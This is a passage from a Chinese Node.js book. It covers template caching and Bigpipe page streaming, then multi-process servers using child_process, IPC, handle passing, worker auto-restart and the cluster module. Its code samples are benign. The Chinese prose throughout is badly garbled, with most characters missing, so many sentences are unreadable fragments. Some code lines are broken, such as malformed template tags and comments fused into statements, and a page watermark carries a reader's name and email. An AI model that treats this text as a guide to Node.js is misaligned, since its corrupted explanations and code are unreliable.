 if (!cache[layout]) { try { cache[layout] = fs.readFileSync(path.join(VIEW_FOLDER, layout), 'utf8'); 
} catch (e) { res.writeHead(500, {'Content-Type': 'text/html'}); res.end('布局文件错误'); return; 
} 
} } var layoutContent =%
 cache[layout] || '<%-body >';
var replaced;
try {  replaced = renderLayout(layoutContent, viewname); 
} catch (e) { res.writeHead(500, {'Content-Type': 'text/html'});  res.end('模板文件错误');  return; 
} // 将模板和布局文件名做key缓存var key = viewname + ':' + (layout || ''); if (!cache[key]) { 
 //编译模板
 cache[key] = cache(replaced); } res.writeHead(200, {'Content-Type': 'text/html'}); var html = cache[key](data); res.end(html); 
}; 
，我们可以实用，下
res.render('user', { layout: 'layout.html', users: [] 
}); //者res.render('profile', { 
layout: 'layout.html', users: [] }); 
7. 
从前的实中我们可以到一些的优，要有下几。. 。. 编后的数。上个之后，的性能与生的数接相关，这个数与的复杂
有接关系。在中编写了，的性能接的性能。优就是对性能的优，以加入一优
中的式
了这几个的外，的实也与性能相关。本的实中用了new Function()，事实上还可以使用eval()对于，本中用的是接相加，有的用数组的，最后有相。对于量的，本用的是with作用的实了，有的用了本一，定量的（obj. username），定量不用with可以上下。这些都是的因。由于有数量多，不做。
8. 
技术的，务开发与HTML的工作分开，它的就是一。这与MVC中的数、、图分一，与前端HTML、CSS、JavaScript分的一，、、分开。着Node的，能在前后端用实在是不过的事情，甚至都不用复实。本了的本，今样的不的性性能。最的有EJS、Jade，它们在语言的上不相，EJS是ASP、PHP、JSP的，JadePython、Ruby的。
本了技术的实，读者可以本的实自己的，也可以使用EJS、Jade熟的，了上的，还有过能。
8.5.4Bigpipe 
这个与在4中到的Bagpipe相，不过Bagpipe的为，是用于用的。的Bigpipe是产生于Facebook的前端加技术，它的要是为了解决数页的加问题，在2010年的Velocity会上，时自Facebook的生分享了题，后起了国内大的反。
这以一个的下前到的MVC技术在的问题
app.get('/profile', function (req, res) { db.getData('sql1', function (err, users) { db.getData('sql2', function (err, articles) { 
res.render('user', { layout: 'layout.html', users: users, articles: articles 
});  }); }); }); 
这个中，我们profile页要usersarticles数，后过layout user，最发页到端。可能的，的数过EventProxy解开，下
app.get('/profile', function (req, res) { var ep = new EventProxy(); ep.all('users', 'articles', function (users, articles) { 
 res.render('user', { layout: 'layout.html', users: users, articles: articles 
 }); }); ep.fail(function (err) { 
 res.render('err', {message: err.message}); }); db.getData('sql1', ep.done('users')); db.getData('sql2', ep.done('articles')); 
}); 
至还在的问题是
问题在于我们的页，最的HTML要在有的数后才到端。Node过已经多个数源的并起了，最的页决于个数请中应时的个。在数应之前，用到的是页，这是分不友好的用。
Bigpipe的解决是页分多个部分（pagelet），用没有数的（），个部分到前端，最，个网页的。这个过程中要前端JavaScript的与，它后续的数到页上。
Bigpipe是一个要前后端实的优技术，这个技术有几个要的。
页（数的）。
后端续性的数。
前端。
Bigpipe的程图图8-8。

图8-8 Bigpipe的程图
1. 
页由后端，下
var cache = {}; var layout = 'layout.html'; 
app.get('/profile', function (req, res) { if (!cache[layout]) {  cache[layout] = fs.readFileSync(path.join(VIEW_FOLDER, layout), 'utf8'); } 
res.writeHead(200, {'Content-Type': 'text/html'}); res.write(render(complie(cache[layout]))); // TODO 
}); 
这个中要入要的前端脚本，jQuery、Underscore用，次要入我们要的前端脚本，这的为bagpipe.js。下
// layout.html <!DOCTYPE html> <html> 
<head> <title>Bagpipe</title> <script src="jquery.js"></script> <script src="underscore.js"></script> <script src="bigpipe.js"></script> 
</head> 
<body> <div id="body"></div> <script type="text/template" id="tpl_body">
 <div>< =articles %></div> 
% 
</script> <div id="footer"></div> <script type="text/template" id="tpl_footer"> 
 <div>< =users %%></div> 
</script> </body> </html> <script> 
var bigpipe = new Bigpipe(); bigpipe.ready('articles', function (data) {
 $('#body').html(_.render($('#tpl_body').html(), {articles: data})); }); bigpipe.ready('copyright', function (data) { 
 $('#footer').html(_.render($('#tpl_footer').html(), {users: data})); }); </script> 
2. 
后，个网页的并没有，用已经可以到个页的大样。接下我们继续数，与的数不，这的数之后要前端脚本，是要对它，下
app.get('/profile', function (req, res) { if (!cache[layout]) {  cache[layout] = fs.readFileSync(path.join(VIEW_FOLDER, layout), 'utf8'); } 
res.writeHead(200, {'Content-Type': 'text/html'}); res.write(render(complie(cache[layout]))); ep.all('users', 'articles', function () { 
 res.end(); }); ep.fail(function (err) { 
 res.end(); }); db.getData('sql1', function (err, data) { 
 data = err ? {} : data; 
 res.write('<script>bigpipe.set("articles", ' + JSON.stringify(data) + ');</script>'; }); db.getData('sql2', function (err, data) { 
 data = err ? {} : data;  res.write('<script>bigpipe.set("copyright", ' + JSON.stringify(data) + ');</script>'; }); }); 
对于要到页上的数，它的下
res.write('<script>bigpipe.set("articles", ' + JSON.stringify(data) + ');</script>'; 
这样最HTML的上还应有下这样的
<script>bigpipe.set("articles", "I am article");</script> <script>bigpipe.set("copyright", "I am copyright");</script>
这的序决于次用。由于Node的性，多次用可以并，就可以推到HTML页上，着前端脚本的，就可以到页上。
相Facebook始的Bigpipe应用在PHP这环境中，Node在数上可以并，使Bigpipe。
3. 
前的bigpipe.ready()bigpipe.set()是个前端的机，前者以一个key一个事，后者触发一个事，以页的机。这个数定在bigpipe.js中，下
var Bigpipe = function () { this.callbacks = {}; }; 
Bigpipe.prototype.ready = function (key, callback) { if (!this.callbacks[key]) {
 this.callbacks[key] = []; } this.callbacks[key].push(callback); 
}; 
Bigpipe.prototype.set = function (key, data) { var callbacks = this.callbacks[key] || []; for (var i = 0; i < callbacks.length; i++) { 
 callbacks[i].call(this, data); } }; 
4. 
Bigpipe网页数分，使用在上网页前好了，着数的过程页，使用能到页是活的。这一开始页，后在个时候好用的好。Node在这个过程中，性使数的能并，数的与数用的序关，用的数可以到页中，这个性使Bigpipe。
要Bigpipe这样页的过程，实过Ajax也能，是Ajax的后是HTTP用，要多的网接，Bigpipe数与前页用相的网接，开分小。Bigpipe要的多，MVC中的接要复杂多，在网要的且数请时的页中使用。
8.6
本的内为，在Web应用的个过程中，从请到应请的个过程都有性，本就可以一个能的Web开发。过的Web技术，着的，开发者应用，不的实，这好没有图在。本的内能为Node开发者图的发，在开发Web应用时能心有，了。
在熟的Web有Connect、Express，本中的内在这些中都有实，因为的因，本中的实为，实使用请使用这些熟的。
8.7
本的源下
. http://tools.ietf.org/html/rfc3875 . http://tools.ietf.org/html/rfc2069 . http://www.ietf.org/rfc/rfc1867.txt 
. http://en.wikipedia.org/wiki/Cross-site_request_forgery 
. https://github.com/senchalabs/connect/blob/master/lib/middleware/csrf.js . http://en.wikipedia.org/wiki/Model%E2%80%93view%E2%80%93controller 
. http://www.ibm.com/developerworks/webservices/library/ws-restful/ 
. http://en.wikipedia.org/wiki/Middleware 
. http://mustache.github.io/ 
. https://github.com/joyent/node/wiki/modules#wiki-templating 
. https://developer.mozilla.org/zh-CN/docs/JavaScript/Reference/Global_Objects/Function 

 
第章 



Node在时决定在V8之上，也就着它的与。我们的JavaScript会在个程的个线程上。它的好是程序是一的，在没有多线程的情下没有、线程问题，作系统在时也因为上下的，可以很好高CPU的使用。
是程线程并的，今CPU本是多的，的服务（VPS）还有多个CPU。一个Node程只能用一个，这Node实应用的一个问题CPU
外，由于Node在线程上，一线程上的没有，会起个程的。这Node的实应用了个问题的定在这个问题中，前者只是用不的问题，后者对于实产品一定的。本关于程的会解决这个问题。
从的上言，Node并的线程，在3中我们有过Node自还有一定的I/O线程在，这些I/O线程由libuv，这部分线程对于JavaScript开发者言是的，只在C++开发时才会关到。JavaScript在V8上，是线程的。本JavaScript部分开，以的。
9.1
从到今，Web服务的已经了几次。服务客端请的并发量，就是个程的。
9.1.1
最的服务，是的，它的服务是一次只为一个请服务，有请都次序服务。这了前的请外，余请都于的。它的能相下，次应服务用的时定为N，这服务的QPS为1/N。
这今已本淘，只在一些并发要的应用中在。
9.1.2
为了解决的并发问题，一个的是过程的复时服务多的请用。这样个接都要一个程服务，100个接要动100个程服务，这是的。在程复的过程中，要复程内部的，对于个接都这样的复的，相的会在内中在很多，。并且这个过程由于要复多的数，动是为的。
为了解决动的问题，复（prefork）入服务中，复一定数量的程。时程复用，程创、的开。是这个并不性，一并发请过高，内使用着程数的会。
过复复的的服务有源的，且程数上为M，这服务的QPS为M/N。
9.1.3
为了解决程复中的问题，多线程入服务，一个线程服务一个请。线程相对程的开要小多，并且线程之可以享数，内的问题可以到解决，并且用线程可以创线程的开。是多线程的并发问题只能多程好，因为个线程都有自己立的，这个都要用一定的内。外，由于一个CPU心在一个时只能做一事情，作系统只能过CPU分为时的，线程可以为使用CPU源，是作系统内在线程的时也要线程的上下，线程数量过多时，时会用在上下中。以在大并发量时，多线程还是做到强大的性。
多线程上下的开，线程用的源为程的1/L，源上的，它的QPS为M * L/N。
9.1.4
多线程的服务服了很一时，Apache就是用多线程/多程实的，并发到上时，内用的问题会，这是的C10k问题。
为了解决高并发问题，于事驱动的服务了，像Node与Nginx是于事驱动的实的，用线程了不要的内开上下开。
于事的服务在的问题是本起始时的个问题CPU的用程的性。线程的并不，中以PHP最为——在PHP中没有线程的。它的性是由它个请都立立的上下实的。是对于Node，有请的上下都是统一的，它的定性是解决的问题。
由于有都在线程上，事驱动服务性能的在于CPU的能，它的上决定这服务的性能上，它不多程多线程中源上的，可性前者高。解决多CPU的用问题，的性能上是可的。
9.2
对程线程对多使用不的问题，前人的经是动多程可。想下个程自用一个CPU，以实多CPU的用。，Node了child_process，并且也了child_process.fork()数我们实程的复。
我们一次经的为worker.js，下
var http = require('http'); 
http.createServer(function (req, res) { res.writeHead(200, {'Content-Type': 'text/plain'}); res.end('Hello World\n'); 
}).listen(Math.round((1 + Math.random()) * 1000), '127.0.0.1'); 
过node worker.js动它，会1000到2000之的一个机端。以下为master.js，并过node master.js动它
var fork = require('child_process').fork; var cpus = require('os').cpus(); for (var i = 0; i < cpus.length; i++) { 
fork('./worker.js'); } 
这会前机上的CPU数量复对应Node程数。在*nix系统下可以过ps 
aux | grep worker.js到程的数量，下
$ ps aux | grep worker.js jacksontian 1475 0.0 0.0 2432768 600 s003 S+ 3:27AM 0:00.00 grep worker.js jacksontian 1440 0.0 0.2 3022452 12680 s003 S 3:25AM 0:00.14 /usr/local/bin/node ./worker.js jacksontian 1439 0.0 0.2 3023476 12716 s003 S 3:25AM 0:00.14 /usr/local/bin/node ./worker.js jacksontian 1438 0.0 0.2 3022452 12704 s003 S 3:25AM 0:00.14 /usr/local/bin/node ./worker.js jacksontian 1437 0.0 0.2 3031668 12696 s003 S 3:25AM 0:00.15 /usr/local/bin/node ./worker.js 
图9-1就是的Master-Worker，从。图9-1中的程分为程工作程。这是的分中用于并务的，好的可性定性。程不的务，是管工作程，它是于定的。工作程的务，因为务的多多样，甚至一务由多人开发，以工作程的定性开发者关。

图9-1 Master-Worker
过fork()复的程都是一个立的程，这个程中有着立新的V8实。它要至30的动时至10 MB的内。管Node了fork()我们复程使个CPU内都使用上，是要fork()程是的。好在Node过事驱动的在线程上解决了大并发的问题，这动多个程只是为了分CPU源用起，不是为了解决并发问题。
9.2.1
child_processNode可以创程（child_process）的能。它了4个用于创程。
. spawn()动一个程。
. exec()动一个程，与spawn()不的是接不，它有一个数程的。
. execFile()动一个程可。

. fork()与spawn()，不在于它创Node的程只定要的JavaScript可。spawn()与exec()、execFile()不的是，后者创时可以定timeout性时时，一创的程过定的时会。
exec()与execFile()不的是，exec()已有的，execFile()。这我们以一个为，node worker.js分用上4实，下
var cp = require('child_process'); 
cp.spawn('node', ['worker.js']); 
cp.exec('node worker.js', function (err, stdout, stderr) { 
// some code 
}); 
cp.execFile('worker.js', function (err, stdout, stderr) { 
// some code 
}); 
cp.fork('./worker.js'); 
以上4个在创程之后会程对。它们的可以过9-1。
9-14
/
spawn() × ×

exec() 
√ √ execFile() √ 可√ fork() × Node JavaScript× 
这的可是可以接的，是JavaScript过execFile()，它
图灵社区会员 Eric Liu(guangqiang.dev@gmail.com)专享 尊重版权
的内加下
#!/usr/bin/env node 
管4创程的有些，事实上后3都是spawn()的应用。
9.2.2
在Master-Worker中，要实程管工作程的能，要程工作程之的信。对于child_process，创好了程，后与程信是分的。
在前端中，JavaScript线程与UI用一个线程。JavaScript的时候UI是的，UI时，JavaScript是的，者相。时JavaScript会UI不应。为了解决这个问题，HTML5了WebWorkerAPI。WebWorker创工作线程并在后，使一些为的不线程上的UI。它的API下
var worker = new Worker('worker.js'); worker.onmessage = function (event) { document.getElementById('result').textContent = event.data; }; 
中，worker.js下
var n = 1; 
search: while (true) { n += 1; for (var i = 2; i <= Math.sqrt(n); i += 1)
 if (n % i == 0) 
continue search; // found a prime postMessage(n); 
} 
线程与工作线程之过onmessage()postMessage()信，程对由send()实程程发数，message事实收程发的数，与API在一定程上相。过内，不是享接作相关源，这是为量的做。
Node中对应下
// parent.js 
var cp = require('child_process'); var n = cp.fork(__dirname + '/sub.js'); 
n.on('message', function (m) { console.log('PARENT got message:', m); }); 
n.send({hello: 'world'}); 
// sub.js 
process.on('message', function (m) { 
console.log('CHILD got message:', m); 
}); 
process.send({foo: 'bar'}); 
过fork()者他API，创程之后，为了实程之的信，程与程之会创IPC。过IPC，程之才能过messagesend()。
. 
IPC的是Inter-Process Communication，程信。程信的目的是为了不的程能相问源并工作。实程信的技术有很多，管、管、socket、信量、享内、、Domain Socket。Node中实IPC的是管（pipe）技术。管管，在Node中管是个的，实由libuv，在Windows下由管（named pipe）实，*nix系统用Unix Domain Socket实。在应用上的程信只有的message事send()，接分。图9-2为IPC创实的图。

图9-2 IPC创实图
程在实创程之前，会创IPC并它，后才创程，并过环境量（NODE_CHANNEL_FD）程这个IPC的。程在动的过程中，接这个已在的IPC，从程之的接。图9-3为创IPC管的图。

图9-3 创IPC管的图
立接之后的程就可以自由信了。由于IPC是用管Domain Socket创的，它们与网socket的为，于信。不的是它们在系统内中就了程的信，不用经过实的网，高。在Node中，IPC为Stream对，在用send()时发数（于write()），接收到的会过message事（于data）触发应用。
有的Node据IPC的无定创的IPC。
9.2.3
立好程之的IPC后，仅仅只用发一些的数，不我们的实应用使用。还本一部分要动的服务分自的端，服务都到相的端，会有样的下
var http = require('http'); 
http.createServer(function (req, res) { res.writeHead(200, {'Content-Type': 'text/plain'}); res.end('Hello World\n'); 
}).listen(8888, '127.0.0.1');
次动master.js，下
events.js:72 throw er; // Unhandled 'error' event ^ Error: listen EADDRINUSE  at errnoException (net.js:884:11) 
这时只有一个工作程能到端上，余的程在的过程中都了EADDRINUSE，这是端用的情，新的程不能继续端了。这个问题了我们多个程一个端的想。要解决这个问题，的做是个程不的端，中程端（80），程对外接收有的网请，这些请分到不的端的程上。图图9-4。

图9-4程接收、分网请的图
过，可以端不能复的问题，甚至可以在程上做的，使个程可以为务。由于程接收到一个接，会用一个，因中客端接到程，程接到工作程的过程要用个
。作系统的是有的，一数量的的做了系统的能。为了解决上这样的问题，Node在本v0.5.9入了程发的能。send()了能过IPC发数外，还能发，个可数就是，下
child.send(message, [sendHandle]) 
是是一可以用识源的用，它的内部包了对的。可以用识一个服务端socket对、一个客端socket对、一个UDP接、一个管。
发着在前一个问题中，我们可以这，使程接收到socket请后，这个socket接发工作程，不是新与工作程之立新的socket接发数。的问题可以过这样的解决。我们的。
程下
var child = require('child_process').fork('child.js'); 
// Open up the server object and send the handle var server = require('net').createServer(); server.on('connection', function (socket) { 
socket.end('handled by parent\n'); }); server.listen(1337, function () { 
child.send('server', server); }); 
程下
process.on('message', function (m, server) { if (m === 'server') {  server.on('connection', function (socket) { socket.end('handled by child\n');  }); } }); 
这个中接一个TCP服务发了程。这是起不可的事情，我们测试一，，下
//先启动服务器$ node parent.js  
后新开一个，用上curl工，下
$ curl "http://127.0.0.1:1337/" handled by parent $ curl "http://127.0.0.1:1337/" 
handled by child $ curl "http://127.0.0.1:1337/" handled by child $ curl "http://127.0.0.1:1337/" handled by parent 
中的应也是很不可的，这程程都有可能我们客端发起的请。试试服务发多个程，下
// parent.js 
var cp = require('child_process'); var child1 = cp.fork('child.js'); var child2 = cp.fork('child.js'); 
// Open up the server object and send the handle var server = require('net').createServer(); server.on('connection', function (socket) { 
socket.end('handled by parent\n'); }); server.listen(1337, function () { 
child1.send('server', server); child2.send('server', server); }); 
后在程中程ID，下
// child.js 
process.on('message', function (m, server) { if (m === 'server') {  server.on('connection', function (socket) { socket.end('handled by child, pid is ' + process.pid + '\n');  }); } }); 
用curl测试我们的服务，下
$ curl "http://127.0.0.1:1337/" handled by child, pid is 24673 $ curl "http://127.0.0.1:1337/" handled by parent $ curl "http://127.0.0.1:1337/" handled by child, pid is 24672
测试的是次的都可能不，可能程，也可能不的程。并且这是在TCP上的事情，我们试到HTTP试试。对于程言，我们甚至想要它量一，是否服务发程之后，就可以关服务的，程请
我们对程动，下
// parent.js 
var cp = require('child_process'); 
var child1 = cp.fork('child.js'); var child2 = cp.fork('child.js'); 
// Open up the server object and send the handle var server = require('net').createServer(); server.listen(1337, function () { 
child1.send('server', server); child2.send('server', server); // 关server.close(); 
}); 
后对程动，下
// child.js var http = require('http'); var server = http.createServer(function (req, res) { 
res.writeHead(200, {'Content-Type': 'text/plain'}); res.end('handled by child, pid is ' + process.pid + '\n'); }); 
process.on('message', function (m, tcp) { if (m === 'server') {  tcp.on('connection', function (socket) { server.emit('connection', socket);  }); } }); 
新动parent.js后，次测试，下
$ curl "http://127.0.0.1:1337/" handled by child, pid is 24852 $ curl "http://127.0.0.1:1337/" handled by child, pid is 24851
这样一，有的请都是由程了。个过程中，服务的过程发生了一次，图9-5。

图9-5程请发工作程
程发并关之后，为了图9-6的。

图9-6程发并关后的
我们发，多个程可以时相端，没有EADDRINUSE发生了。
1. 
上的是发，是，发我们接服务对发程有没有它是否的服务对发了程为它可以发到多个程中发程为程中还在这个对本开这些的在。
目前程对send()可以发的包括下几。
. net.Socket。TCP接。
. net.Server。TCP服务，立在TCP服务上的应用服务都可以享到它的好。
. net.Native。C++的TCP接IPC管。
. dgram.Socket。UDP接。
. dgram.Native。C++的UDP接。

send()在发到IPC管前，组个对，一个数是handle，一个是message。message数下
{ 
cmd: 'NODE_HANDLE', 
type: 'net.Server', 
msg: message 
} 
发到IPC管中的实上是我们要发的，实上是一个数。这个message对在写入到IPC管时也会过JSON.stringify()序。以最发到IPC中的信都是，send()能发并不着它能发对。
接了IPC的程可以读到程发的，过JSON.parse()解还为对后，才触发message事应用使用。在这个过程中，对还要过，message.cmd的以NODE_为前，它应一个内部事internalMessage。message.cmd为NODE_HANDLE，它message.type到的一起还一个对应的对。这个过程的图图9-7。

图9-7的发与还图
以发的TCP服务为，程收到后的还过程下
function(message, handle, emit) { var self = this; 
var server = new net.Server(); server.listen(handle, function() {  emit(server); }); } 
上的中，程message.type创对应TCP服务对，后到上。由于不应用，以在程中，开发者会有一服务就是从程中接过的。的是，Node程之只有，不会对，这是的。
目前Node只上到的几，并的都能在程之，它有的发还的过程。
2. 
在了解了后的后，我们继续探为过发后，多个程可以到相的端不起EADDRINUSE。也很，我们立动的程中，TCP服务端socket接的并不相，到相的端时会。
Node对个端都了SO_REUSEADDR，这个的是不程可以就相的网端，这个服务端接可以不的程复用，下
setsockopt(tcp->io_watcher.fd, SOL_SOCKET, SO_REUSEADDR, &on, sizeof(on)) 
由于立动的程相之并不，以相端时就会。对于send()发的还的服务言，它们的是相的，以相端不会起。
多个应用相端时，一时只能个程用。言之就是网请服务端发时，只有一个的程能到接，也就是只有它能为这个请服务。这些程服务是的。
9.2.4
至，我们了创程、程信的IPC实、在程的发还、
端用。过这些技术，用child_process在机上Node是相对的事情。因在多CPU的环境下，Node程能分用源不是题。
9.3
好了，分用了多CPU源，就可以接客端大量的请了。请，
我们还有一些要。性能问题。多个工作程的活管。工作程的。
者数的动新入。他。是的，我们创了很多工作程，个工作程是在线程上的，它的定
性还不能到的。我们要立起一个的机Node应用的性。
9.3.1
次到程对上，了人关的send()message事外，程还有些了message事外，Node还有下这些事。
. error程复创、、发时会触发事。
. exit程时触发事，程是，这个事的一个数为，否为null。程是过kill()的，会到个数，它程时的信。
. close在程的入中时触发事，数与exit相。
. disconnect在程程中用disconnect()时触发事，在用时关IPC。

上这些事是程能到的与程相关的事。了send()外，还能过kill()程发。kill()并不能过IPC相的程，它只是程发了一个系统信。认情下，程过kill()程发一个SIGTERM信。它与程认的kill()，下
//子进程child.kill([signal]); //当前进程process.kill(pid, [signal]); 
它们一个发程，一个发目程。在POSIX中，有一的信系统，在中kill -l可以到的信，下
$ kill -l 
 1) SIGHUP  2) SIGINT  3) SIGQUIT 4) SIGILL  5) SIGTRAP 6) SIGABRT 7) SIGEMT  8) SIGFPE 
 9) SIGKILL 10) SIGBUS 11) SIGSEGV 12) SIGSYS 
13) SIGPIPE 14) SIGALRM 15) SIGTERM 16) SIGURG 
17) SIGSTOP 18) SIGTSTP 19) SIGCONT 20) SIGCHLD 
21) SIGTTIN 22) SIGTTOU 23) SIGIO 24) SIGXCPU 
25) SIGXFSZ 26) SIGVTALRM 27) SIGPROF 28) SIGWINCH 29) SIGINFO 30) SIGUSR1 31) SIGUSR2 
Node了这些信对应的信事，个程都可以这些信事。这些信事是用程的，个信事有不的，程在收到应信时，应做定的为，SIGTERM是信，程收到信时应。下
process.on('SIGTERM', function() { console.log('Got a SIGTERM, exiting...'); process.exit(1); 
}); 
console.log('server running with PID:', process.pid); process.kill(process.pid, 'SIGTERM'); 
9.3.2
有了程之的相关事之后，就可以在这些关系之创要的机了。至我们能过程的exit事的信，接着前的多程，我们在程上要加入一些程管的机，新动一个工作程继续服务。图图9-8。

图9-8程加入程管机的图
实下
// master.js var fork = require('child_process').fork; var cpus = require('os').cpus(); 
var server = require('net').createServer(); server.listen(1337); 
var workers = {}; 
var createWorker = function () { var worker = fork(__dirname + '/worker.js'); // 出时重启动的进程
worker.on('exit', function () {  console.log('Worker ' + worker.pid + ' exited.');  delete workers[worker.pid];  createWorker(); 
}); // 句柄转发worker.send('server', server); workers[worker.pid] = worker; console.log('Create worker. pid: ' + worker.pid); 
}; 
for (var i = 0; i < cpus.length; i++) { createWorker(); } 
//进程自出时有工作进程出process.on('exit', function () { for (var pid in workers) {  workers[pid].kill(); } }); 
测试一下上的，下
$ node master.js Create worker. pid: 30504 Create worker. pid: 30505 Create worker. pid: 30506 Create worker. pid: 30507 
过kill个程试试，下
$ kill 30506 
是30506程后，自动动了一个新的工作程30518，程数量并没有发生
，下
Worker 30506 exited. Create worker. pid: 30518 
在这个场景中我们动了一个程，在实务中，可能有的bug工作程，我们要这，下
// worker.js var http = require('http'); var server = http.createServer(function (req, res) { 
res.writeHead(200, {'Content-Type': 'text/plain'}); res.end('handled by child, pid is ' + process.pid + '\n'); }); 
var worker; process.on('message', function (m, tcp) { 
if (m === 'server') {  worker = tcp;  worker.on('connection', function (socket) { 
server.emit('connection', socket);  }); } }); 
process.on('uncaughtException', function () { // 接收的接worker.close(function () { 
 //有有接开出进程 process.exit(1); }); }); 
上的程是，一有的，工作程就会立接收新的接有接开后，程。程在到工作程的exit后，会立动新的程服务，以个中是有程在为用服务的。
1. 
上在的问题是要到已有的有接开后程才，在极端的情下，有工作程都接收新的接，在的。在到程才的过程中，有新的请可能在没有工作程为新用服务的情景，这会大部分请。
为要这个过程，不能到工作程后才新的工作程。也不能程，因为这样会已接的用接开。于是我们在的程中加一个自
（suicide）信。工作程在要时，程发一个自信，后才接收新的接，有接开后才。程在接收到自信后，立创新的工作程服务。动下
// worker.js 
process.on('uncaughtException', function (err) { process.send({act: 'suicide'}); // 接收的接worker.close(function () { 
 //有有接开出进程 process.exit(1); }); }); 
程工作程的务，从exit事的数中到message事的数中，下
var createWorker = function () { var worker = fork(__dirname + '/worker.js'); // 启动的进程worker.on('message', function (message) { 
 if (message.act === 'suicide') { createWorker(); 
} }); worker.on('exit', function () { 
 console.log('Worker ' + worker.pid + ' exited.'); 
 delete workers[worker.pid]; }); worker.send('server', server); workers[worker.pid] = worker; console.log('Create worker. pid: ' + worker.pid); 
}; 
为了的，我们工作程的为，一有用请，就会有一个可的工作程，下
var server = http.createServer(function (req, res) { res.writeHead(200, {'Content-Type': 'text/plain'}); res.end('handled by child, pid is ' + process.pid + '\n'); throw new Error('throw exception'); 
}); 
后动有程，下
$ node master.js  Create worker. pid: 48595 Create worker. pid: 48596 Create worker. pid: 48597 Create worker. pid: 48598 
用curl工测试，下
$ curl http://127.0.0.1:1337/ handled by child, pid is 48598
信，下
Create worker. pid: 48602 Worker 48598 exited. 
与前一相，创新工作程在前，程在后。在这个可的程之前，是有新的工作程上它的。至我们了程的，一有，程会创新的工作程为用服务，的程一已有接就自动开。个过程使我们的应用的定性性大大高。图图9-9。

图9-9程的自
这在问题的是有可能我们的接是接，不是HTTP服务的这接，接开可能要的时。为为已有接的开一个时时是要的，在定时强
的下
process.on('uncaughtException', function (err) { process.send({act: 'suicide'}); // 接收的接worker.close(function () { 
 //有有接开出进程
 process.exit(1); }); // 5出进程setTimeout(function () { 
 process.exit(1); }, 5000); }); 
程中能的，就着有一在性上是不的。为程前，过下问题在是要做的事情，它可以我们很好定的，下
process.on('uncaughtException', function (err) { // 录日志logger.error(err); // 发自信process.send({act: 'suicide'}); // 接收的接worker.close(function () { 
 //有有接开出进程
 process.exit(1); }); // 5出进程setTimeout(function () { 
 process.exit(1); }, 5000); }); 
2. 
过自信程可以使新接是有程服务，是还是有极端的情。工作程不能，动的过程中就发生了，者动后接到接就收到，9会工作程，这不于我们的情，因为这时内已经不的，极有可能是程序编写的。
为了这的，在一定的下，不应反复。在时内定只能多次，过就触发giveup事，工作程这个要事。为了量的统，我们入一个做，在次工作程之并是否过，下
//重启数var limit = 10;
//时间单位var during = 60000; var restart = []; var isTooFrequently = function () { 
// 录重启时间var time = Date.now(); var length = restart.push(time); if (length > limit) { 
 //出10录
 restart = restart.slice(limit * -1); } // 重启前10重启间的时间间return restart.length >= limit && restart[restart.length - 1] -restart[0] < during; 
}; 
var workers = {}; 
var createWorker = function () { // 检查是否过if (isTooFrequently()) { 
 //发giveup事件不重启 process.emit('giveup', length, during);  return; 
} var worker = fork(__dirname + '/worker.js'); worker.on('exit', function () { 
 console.log('Worker ' + worker.pid + ' exited.'); 
 delete workers[worker.pid]; }); // 重启动的进程worker.on('message', function (message) { 
 if (message.act === 'suicide') { createWorker(); 
} }); // 句柄转发worker.send('server', server); workers[worker.pid] = worker; console.log('Create worker. pid: ' + worker.pid); 
}; 
giveup事是uncaughtException的事。uncaughtException只中个工作程，在性下，不会用不到服务的情，是这个giveup事中没有程服务了，分。为了性，我们应在giveup事中加要，并系统到这个，。
9.3.3
在多程之相的端，使用请能分到多个程上，这的好
是可以CPU源都用起。这客人的分发多个作。多个有，个的工作量是一门学问，不能一些不过，也不能一些着，这多个工作量的。
Node认的机是用作系统的。的就是在一工作程中，着的程对到的请，到服务。
一言，这对大是的，个程可以自己的。是对于Node言，要分的是它的是由CPU、I/O个部分的，的是CPU的。对不的务，可能在I/O，CPU为的情，这可能个程能到多请，不的情。
为Node在v0.11中了一新的使，这新的Round-Robin，。的工作是由程接接，次分发工作程。分发的是在N个工作程中，次i = (i+ 1) mod n个程发接。在cluster中用它的下
//启用Round-Robin cluster.schedulingPolicy = cluster.SCHED_RR //不启用Round-Robin cluster.schedulingPolicy = cluster.SCHED_NONE
者在环境量中NODE_CLUSTER_SCHED_POLICY的，下
export NODE_CLUSTER_SCHED_POLICY=rr export NODE_CLUSTER_SCHED_POLICY=none 
Round-Robin，可以CPUI/O的不。Round-Robin也可以过服务实，是它会服务上的是的。
9.3.4
在5中，我们到在Node程中不多数，因为它会加收的，性能。时，Node也不在多个程之享数。在实的务中，要享一些数，数，这在多个程中应是一的。为，在不享数的情下，我们要一机实数在多个程之的享。
1. 
解决数享最接、的就是过数，数到数、、服务（Redis）中，有工作程动时读内中。这在的问题是数发生，还要一机到个程，使它们的内部也到新。
实的机有，一是个程定时，图图9-10。
定时的问题是时不能过，程过多，会并发，数没有发生，这些会没有，加的开。时过，数发生
时，不能时新到程中，会有一定的。

图9-10定时图
2. 
一的是数发生新时，动程。，使是动，也要一机时数的。这个过程不能，我们可以的程数量，我们这用发是否的程做程。为了不务，可以这个程为只，不务，图图9-11。

图9-11动图
这推机程信，在多服务时会，是可以用TCPUDP的。程在动时从服务了读一次数外，还程信到服务。一过发有数新后，信，新后的数发工作程。由于不多程一，应的不至于过大，一的服务的并不大，以可以时，一发新，就能实时推到个程中。
9.4Cluster 
前了child_process中的大多数，以过这个强大的机。熟Node，也你会为不cluster。上的问题，Node在v0.8本时新的cluster就能解决。在v0.8本之前，实多程过child_process实，要创机Node，由于有这多要，对工程言是一相对的工作，于是v0.8时接入了cluster，用以解决多CPU的用问题，时也了的API，用以程的性问题。
对于本开到的创Node程，cluster实起也是很的事情，下
// cluster.js var cluster = require('cluster'); 
cluster.setupMaster({ exec: "worker.js" }); 
var cpus = require('os').cpus(); for (var i = 0; i < cpus.length; i++) { cluster.fork(); } 
node cluster.js会到与前创程的相。就的言，它喜欢下的作为
var cluster = require('cluster'); var http = require('http'); var numCPUs = require('os').cpus().length; 
if (cluster.isMaster) { // Fork workers for (var i = 0; i < numCPUs; i++) { 
 cluster.fork(); } 
cluster.on('exit', function(worker, code, signal) {  console.log('worker ' + worker.process.pid + ' died'); }); } else { // Workers can share any TCP connection 
// In this case its a HTTP server 
http.createServer(function(req, res) {  res.writeHead(200);  res.end("hello world\n"); 
}).listen(8000); } 
在程中是程还是工作程，要决于环境量中是否有NODE_UNIQUE_ID，下
cluster.isWorker = ('NODE_UNIQUE_ID' in process.env); cluster.isMaster = (cluster.isWorker === false); 
